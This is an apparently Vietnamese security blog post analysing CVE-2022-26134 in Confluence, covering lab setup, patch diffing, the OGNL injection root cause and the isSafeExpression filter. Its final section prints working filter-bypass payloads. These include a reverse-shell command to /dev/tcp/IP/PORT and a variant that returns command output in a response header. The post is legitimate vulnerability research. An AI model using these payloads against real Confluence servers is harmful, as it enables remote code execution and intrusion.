---
title: "Atlassian Confluence Server and Data Center - OGNL Injection - CVE-2022-26134"
summary: "Brief analysis of CVE-2022-26134"
date: 2022-06-17
tags: ["cve", "atlassian", "confluence", "ognl"]
---
## List of vuln references
- CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134
- Advisory: https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html

## Setup
Khởi tạo Confluence với file `docker-compose.yml` có nội dung như sau:
```yaml
version: "3.9"

services:
  conf:
    image: atlassian/confluence-server:7.18.0
    container_name: confluence-server
    depends_on:
      - db
    ports:
       - 8090:8090
       - 8091:8091
       - 5005:5005
    environment:
      ATL_JDBC_URL: jdbc:postgresql://db:5432/confluence
      ATL_JDBC_USER: postgres
      ATL_JDBC_PASSWORD: postgres
      ATL_DB_TYPE: postgresql
      ATL_DB_DRIVER: org.postgresql.Driver
      ATL_DB_SCHEMA_NAME: confluence
      JVM_SUPPORT_RECOMMENDED_ARGS: -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
      ATL_LICENSE_KEY:
        [REDACTED]

  db:
    image: postgres
    restart: always
    container_name: confluence-database
    environment:
      POSTGRES_PASSWORD: postgres
      POSTGRES_DB: confluence

```
Thêm thắt một chút cho việc debug từ file Yaml có sẵn tại: https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/confluence-cve-2022-26134/docker-compose.yml

## How to diff
Sử dụng công cụ diff có sẵn của IntelliJ IDEA:
```
idea diff [folder1] [folder2]
```

Theo advisory, bản patch được áp dụng tại file `xwork-1.0.3-atlassian-10.jar` thay thế cho file cũ `xwork-1.0.3-atlassian-8.jar`.

![](https://i.imgur.com/PgpBY36.png)

Sau khi load vào công cụ diff, tiến hành chọn cả 2 files, nhấn chuột phải và chọn `Compare New Files with Each Other`.

![](https://i.imgur.com/yZTiSyJ.png)

## Root cause
Trong method `ActionChainResult.execute()` thực hiện method `TextParseUtil.translateVariables()` với tham số lần lượt là 2 parameters `namespace` và `actionName`.

![](https://i.imgur.com/GYZPrJi.png)

Method `TextParseUtil.translateVariables()` được định nghĩa như sau:
```java
// com/opensymphony/xwork/util/TextParseUtil.class
public static String translateVariables(String expression, OgnlValueStack stack) {
    StringBuilder sb = new StringBuilder();
    Pattern p = Pattern.compile("\\$\\{([^}]*)\\}");
    Matcher m = p.matcher(expression);

    int previous;
    for (previous = 0; m.find(); previous = m.end()) {
        String g = m.group(1);
        int start = m.start();

        String value;
        try {
            Object o = stack.findValue(g);
            value = o == null ? "" : o.toString();
        } catch (Exception var10) {
            value = "";
        }

        sb.append(expression.substring(previous, start)).append(value);
    }

    if (previous < expression.length()) {
        sb.append(expression.substring(previous));
    }

    return sb.toString();
}
```

Method này thực hiện việc tìm trong tham số `expression` giá trị nào thỏa mãn với regex `\\$\\{([^}]*)\\}` thì sẽ áp dụng phương thức `OgnlValueStack.findValue()` để execute OGNL.

![](https://i.imgur.com/6kMhsHC.png)

Quay lại với các tham số được truyền vào `TextParseUtil.translateVariables()`, giá trị của `namespace` được lấy từ `ServletDispatcher.getNameSpace()`.
```java
// com/opensymphony/webwork/dispatcher/ServletDispatcher.class
protected String getNameSpace(HttpServletRequest request) {
    String servletPath = request.getServletPath();
    return getNamespaceFromServletPath(servletPath);
}
```
Method `getNamespaceFromServletPath()` được gọi với tham số là `servletPath`.
```java
// com/opensymphony/webwork/dispatcher/ServletDispatcher.class
public static String getNamespaceFromServletPath(String servletPath) {
    servletPath = servletPath.substring(0, servletPath.lastIndexOf("/"));
    return servletPath;
}
```
Method này sẽ trả về giá trị của `servletPath` từ vị trí đầu tiên tới vị trí của kí tự `/` cuối cùng.

=> Như vậy để OGNL expression của ta được thực hiện thì kí tự `/` phải được đặt vào cuối servlet path.

## Bypass `isSafeExpression()` check
Đây là cơ chế được thêm vào Confluence sau phiên bản 7.16 nhằm ngăn chặn các OGNL expression độc hại. Cốt lõi của method `isSafeExpression()` là sử dụng method `isSafeExpressionInternal()` nên ta chỉ tập trung vào phân tích hàm này.

```java
// com/opensymphony/xwork/util/SafeExpressionUtil.class
private boolean isSafeExpressionInternal(String expression, Set<String> visitedExpressions) {
    if (!this.SAFE_EXPRESSIONS_CACHE.contains(expression)) {
        if (this.UNSAFE_EXPRESSIONS_CACHE.contains(expression)) {
            return false;
        }

        if (this.isUnSafeClass(expression)) {
            this.UNSAFE_EXPRESSIONS_CACHE.add(expression);
            return false;
        }

        if (SourceVersion.isName(this.trimQuotes(expression)) && this.allowedClassNames.contains(this.trimQuotes(expression))) {
            this.SAFE_EXPRESSIONS_CACHE.add(expression);
        } else {
            try {
                Object parsedExpression = OgnlUtil.compile(expression);
                if (parsedExpression instanceof Node) {
                    if (this.containsUnsafeExpression((Node)parsedExpression, visitedExpressions)) {
                        this.UNSAFE_EXPRESSIONS_CACHE.add(expression);
                        log.debug(String.format("Unsafe clause found in [\" %s \"]", expression));
                    } else {
                        this.SAFE_EXPRESSIONS_CACHE.add(expression);
                    }
                }
            } catch (RuntimeException | OgnlException var4) {
                this.SAFE_EXPRESSIONS_CACHE.add(expression);
                log.debug("Cannot verify safety of OGNL expression", var4);
            }
        }
    }

    return this.SAFE_EXPRESSIONS_CACHE.contains(expression);
}
```

Lần đầu dừng tại hàm này, OGNL expression của ta sẽ được đưa vào method `OgnlUtil.compile()` để parse, sau đó đưa vào method `this.containsUnsafeExpression()` để xử lí.

```java
// com/opensymphony/xwork/util/SafeExpressionUtil.class
private boolean containsUnsafeExpression(Node node, Set<String> visitedExpressions) {
    String nodeClassName = node.getClass().getName();
    if (UNSAFE_NODE_TYPES.contains(nodeClassName)) {
        return true;
    } else if ("ognl.ASTStaticMethod".equals(nodeClassName) && !this.allowedClassNames.contains(getClassNameFromStaticMethod(node))) {
        return true;
    } else if ("ognl.ASTProperty".equals(nodeClassName) && this.isUnSafeClass(node.toString())) {
        return true;
    } else if ("ognl.ASTMethod".equals(nodeClassName) && this.unsafeMethodNames.contains(getMethodInOgnlExp(node))) {
        return true;
    } else if ("ognl.ASTVarRef".equals(nodeClassName) && UNSAFE_VARIABLE_NAMES.contains(node.toString())) {
        return true;
    } else if ("ognl.ASTConst".equals(nodeClassName) && !this.isSafeConstantExpressionNode(node, visitedExpressions)) {
        return true;
    } else {
        for(int i = 0; i < node.jjtGetNumChildren(); ++i) {
            Node childNode = node.jjtGetChild(i);
            if (childNode != null && this.containsUnsafeExpression(childNode, visitedExpressions)) {
                return true;
            }
        }

        return false;
    }
}
```

Method này hoạt động bằng cách parse OGNL expression thành các AST node rồi lặp qua từng node để kiểm tra.
Những yếu tố mà thư viện XWork dựa vào để xác định expression an toàn hay không:
- Node type
- Class name
- Method name
- Variable name

Cụ thể các node, class, method và variable được xem là unsafe:

![](https://i.imgur.com/sYFbC8i.png "this.UNSAFE_NODE_TYPES")

![](https://i.imgur.com/C3XSJuA.png "this.unsafePropertyNames")

![](https://i.imgur.com/nR4JMq8.png "this.unsafeMethodNames")

![](https://i.imgur.com/ZDh83V4.png "this.UNSAFE_VARIABLE_NAMES")

và các class name được xem là safe tại property `allowedClassNames`:

![](https://i.imgur.com/EcdGBLz.png)

Method `this.isUnsafeClass()` có nhiệm vụ kiểm tra class name được sử dụng trong expression có nằm trong property `unsafePropertyNames` hay không.

![](https://i.imgur.com/uORHKu9.png "this.isUnsafeClass()")

### Payload testing
Đầu tiên, chúng ta xét payload đơn giản sau:
```
${@java.lang.Runtime@getRuntime().exec("touch /tmp/pwned")}
```

Expression hiện tại của ta có dạng `ognl.ASTChain`.

![](https://i.imgur.com/kJmU1ba.png)

Sau đó lấy child node và tiếp tục parse.

![](https://i.imgur.com/t7vI4ps.png)

Hiện tại `nodeClassName` có giá trị `ognl.ASTStaticMethod` và không nằm trong `allowedClassNames` nên sẽ trả về true. Đồng nghĩa với việc payload của ta đã được xem là unsafe và sẽ không thực hiện payload nữa.

![](https://i.imgur.com/hCw4xMV.png)

#### Bypass ways
##### Unicode escape
Sử dụng các kí tự được unicode escaped (`\u0041` => `a`). Kĩ thuật này được anh Jang viết tại [đây](https://sec.vnpt.vn/2021/08/atlassian-confluence-pre-auth-rce-cve-2021-26084-va-cau-chuyen-ve-diem-mu-khi-tim-bug/).

Về cơ bản, trong quá trình xử lí OGNL, method `OgnlParserTokenManager.getNextToken()` sử dụng method `JavaCharStream.readChar()` có hỗ trợ xử lí chuỗi unicode escape nên chúng ta có thể lợi dụng điều này để vượt qua được bộ lọc.

##### Nối chuỗi
Ý tưởng được lấy từ blog của anh [@mr_r3bot](https://mr-r3bot.github.io/research/2022/06/06/Confluence-Preauth-RCE-2022.html).
```
${Class.forName("java.lang."+"Runtime").getMethod("getRuntime",null).invoke(null,null).exec("touch /tmp/pwned")}}
```
Những thứ mà payload này sử dụng để vượt qua được các constraints:
1. Sử dụng trực tiếp class `Class` thay vì các cách như: `java.lang.Class`, `''.class`, `''.getClass()`.
2. Tạo thành 2 chuỗi con và sử dụng nối chuỗi để ghép thành `java.lang.Runtime` ở giai đoạn runtime nhằm bypass method `this.isUnSafeClass()` trong đoạn xử lí đối với `ognl.ASTConst` vốn nằm ở giai đoạn pre-processing.
    > Chúng ta có nhiều cách để đa dạng hóa payload ở bước này vì payload được thực hiện ở giai đoạn runtime. Tham khảo thêm tại [đây](https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass).
3. Vì sử dụng kĩ thuật [Reflection](https://www.oracle.com/technical-resources/articles/java/javareflection.html) để truy cập vào các method trong class `Runtime`, cộng với việc 2 method là `getMethod` và `invoke` không bị chặn nên ta có thể call được method `Runtime.exec()`.

##### Sử dụng các class có sẵn và không bị blacklist
Payload này được lấy từ repo [jbaines-r7/through_the_wire](https://github.com/jbaines-r7/through_the_wire/blob/main/through_the_wire.py#L78=). Thông tin rằng đây là payload ban đầu mà nhóm APT-31 đã thực hiện tấn công khiến cho lỗ hổng 0-day của Confluence lúc này bị phát hiện và được biết đến rộng rãi như hiện tại.
```
${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("", Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/IP/PORT 0>&1').start()"))}
```

Payload này có nhiệm vụ chính là khởi tạo 1 `nashorn` instance (Javascript engine được tích hợp vào Java) và gọi đến `ProcessBuilder.command()` nhằm mục đích chạy payload để reverse shell.

Chúng ta có thể viết lại để payload này trả về kết quả tại giá trị trong header response như sau:
```
${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("Result",Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("res='';is=java.lang.Runtime.getRuntime().exec('id').getInputStream();while(is.available())res+=String.fromCharCode(is.read());res"))}
```
![](https://i.imgur.com/ihKqH7H.png)
